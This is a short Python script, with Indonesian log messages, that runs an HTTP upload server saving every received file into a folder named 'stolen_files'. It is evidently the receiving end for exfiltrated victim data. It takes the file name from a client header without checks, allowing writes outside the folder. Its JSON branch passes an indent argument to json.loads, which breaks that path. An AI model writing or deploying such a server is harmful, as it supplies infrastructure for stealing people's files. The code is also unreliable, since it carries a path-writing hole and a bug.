from http.server import BaseHTTPRequestHandler, HTTPServer
import os
import logging
import json

class FileServer(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == "/upload":
            content_length = int(self.headers['Content-Length'])
            file_name = self.headers['File-Name']
            content_type = self.headers['Content-Type']
            data = self.rfile.read(content_length)

            if content_type == "application/json":
                with open(os.path.join("stolen_files", file_name), "w") as f:
                    f.write(json.dumps(json.loads(data.decode('utf-8'), indent=2)))
            else:
                with open(os.path.join("stolen_files", file_name), "wb") as f:
                    f.write(data)
            print(f"File/Data diterima: {file_name}")
            logging.info(f"File/Data diterima: {file_name}")

            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(b"Data received")

def run(server_class=HTTPServer, handler_class=FileServer, port=8080):
    if not os.path.exists("stolen_files"):
        os.makedirs("stolen_files")
    logging.basicConfig(filename='file_server.log', level=logging.INFO)
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f"Server berjalan di port {port}")
    httpd.serve_forever()

if __name__ == "__main__":
    run()
